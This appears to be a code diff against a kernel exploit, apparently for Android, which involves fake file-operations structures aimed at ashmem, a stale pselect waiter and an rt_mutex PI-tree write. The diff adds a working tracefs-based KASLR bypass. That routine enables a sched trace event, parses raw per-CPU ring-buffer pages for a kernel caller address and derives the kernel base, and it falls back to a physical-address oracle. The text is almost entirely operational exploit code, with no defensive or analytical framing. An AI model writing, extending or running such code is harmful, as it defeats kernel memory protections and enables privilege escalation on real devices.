@@ -10,7 +10,6 @@
 #define SLIDE_WAIT_NSEC 50000000L
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
-
 #if defined(SLIDE_P0_OFFSET_CANDIDATES) && \
     (!defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE)
 static const uintptr_t slide_p0_offsets[] = {
@@ -198,12 +197,6 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     APP_PRODUCTION_STACK_PI_RIGHT_ONLY
   if (slide_oracle_parent == fake_fops &&
       slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
-    /*
-     * The stale pselect waiter is dequeued from the lock waiter tree before
-     * the PI-tree requeue.  Keep its proven oracle tree and fake-task fields;
-     * build 58 cleared the tree child and consequently produced no write.
-     * Isolate only the established FOPS PI-child direction here.
-     */
     stack_pi_right = data_addr(ASHMEM_MISC_FOPS);
     stack_pi_left = 0;
     slide_pselect_production_stack = 1;
@@ -545,12 +538,12 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
     int tid = atomic_load(&slide_waiter_tid);
+  uint64_t pselect_age_usec = 0;
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
     int ready_ok = -1;
     int guard_ok = -1;
     size_t ready_elapsed_usec = 0;
     size_t guard_elapsed_usec = 0;
-    uint64_t pselect_age_usec = 0;
     char ready_wchan[64] = "<not-read>";
     char guard_wchan[64] = "<not-read>";
 #endif
@@ -1237,7 +1230,6 @@ static int slide_leak_virtual_base(uintptr_t physical_offset) {
   if (!page_base) {
     goto out;
   }
-  /* Any attempted rt_mutex write makes this supervisor attempt non-retryable. */
   app_publish_p0_dirty();
   if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
     pr_error("p0 virtual pipe gate trigger failed\n");
@@ -1434,6 +1426,124 @@ int run_p0_pipe_oracle_diagnostic(int fd) {
 }
 #endif
 
+/*
+ * Tracefs KASLR leak (primary), with fallback to the P0 physical oracle.
+ *
+ * Ported from slide_tracefs.c and integrated here. Uses the
+ * SLIDE_TRACEFS_EVENT_ID / SLIDE_TRACEFS_WORKER_CALLER_OFF defines
+ * already provided via target.h / offset.h.
+ */
+#ifndef SLIDE_TRACEFS_ROOT
+#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
+#endif
+
+static int slide_tracefs_write(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) return 0;
+  size_t len = strlen(value);
+  ssize_t wrote = write(fd, value, len);
+  close(fd);
+  return wrote == (ssize_t)len;
+}
+
+static int slide_tracefs_parse_page(
+    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
+  if (page_len < 20) return 0;
+  uint64_t commit = 0;
+  memcpy(&commit, page + 8, sizeof(commit));
+  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t end = 16 + data_len;
+  if (end > page_len) end = page_len;
+
+  for (size_t pos = 16; pos + 4 <= end;) {
+    uint32_t event_header = 0;
+    memcpy(&event_header, page + pos, sizeof(event_header));
+    uint32_t type_len = event_header & 0x1fU;
+    if (type_len == 30) { pos += 8; continue; }
+    if (type_len == 31) { pos += 12; continue; }
+    if (type_len == 0 || type_len >= 29) break;
+
+    size_t record_len = (size_t)type_len * 4;
+    size_t record = pos + 4;
+    if (record + record_len > end) break;
+    uint16_t event_id = 0;
+    memcpy(&event_id, page + record, sizeof(event_id));
+    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
+      uint64_t caller = 0;
+      memcpy(&caller, page + record + 16, sizeof(caller));
+      uint64_t link_caller =
+          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
+      if (caller >= link_caller) {
+        uint64_t candidate = caller - link_caller;
+        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+          pr_success("tracefs caller=%016llx candidate=%08llx\n",
+                     (unsigned long long)caller,
+                     (unsigned long long)candidate);
+          *candidate_out = (uintptr_t)candidate;
+          return 1;
+        }
+      }
+    }
+    pos = record + record_len;
+  }
+  return 0;
+}
+
+static int slide_tracefs_try_leak(void) {
+  static const char tracing_on[]  = SLIDE_TRACEFS_ROOT "/tracing_on";
+  static const char trace[]       = SLIDE_TRACEFS_ROOT "/trace";
+  static const char event_enable[] =
+      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+
+  if (!slide_tracefs_write(tracing_on, "0") ||
+      !slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_warning("tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
+
+  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (trace_fd >= 0) close(trace_fd);
+
+  usleep(200000);
+
+  slide_tracefs_write(tracing_on, "0");
+
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uintptr_t candidate = 0;
+  int found = 0;
+  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+    char path[128];
+    snprintf(path, sizeof(path),
+             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+    if (fd < 0) continue;
+    unsigned char page[4096];
+    ssize_t got;
+    while ((got = read(fd, page, sizeof(page))) > 0) {
+      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
+        found = 1;
+        break;
+      }
+    }
+    close(fd);
+  }
+  slide_tracefs_write(event_enable, "0");
+  if (!found) {
+    pr_warning("tracefs worker caller not found\n");
+    return 0;
+  }
+  slide_p0_offset = candidate;
+  kaslr_base      = KIMAGE_TEXT_BASE + candidate;
+  kaslr_slide     = candidate;
+  kaslr_done      = 1;
+  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
+             "slide=%016llx p0_offset=%08zx\n",
+             getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide, slide_p0_offset);
+  return 1;
+}
+
 static int slide_commit_stext(uint64_t stext, const char *source) {
   if (stext < KIMAGE_TEXT_BASE) {
     return 0;
@@ -1465,6 +1575,8 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
 int slide_leak_kernel_base(void) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
+
+  /* (A) Forced SLIDE_P0_OFFSET: skip leak paths. */
   if (forced_offset_arg && *forced_offset_arg) {
     char *end = NULL;
     errno = 0;
@@ -1512,6 +1624,21 @@ int slide_leak_kernel_base(void) {
     return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
 #endif
   }
+
+  /* (B) Tracefs as the primary KASLR leak route. */
+  const char *skip_tracefs = getenv("SLIDE_SKIP_TRACEFS");
+  if (!skip_tracefs || !*skip_tracefs) {
+    if (slide_tracefs_try_leak()) {
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+      slide_p0_session_fresh = 1;
+#endif
+      app_publish_p0_offset(slide_p0_offset);
+      return 1;
+    }
+    pr_warning("tracefs leak failed, falling back to P0 physical oracle\n");
+  }
+
+  /* (C) Fallback: unchanged P0 physical oracle. */
   return slide_leak_physical_base();
 #else
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
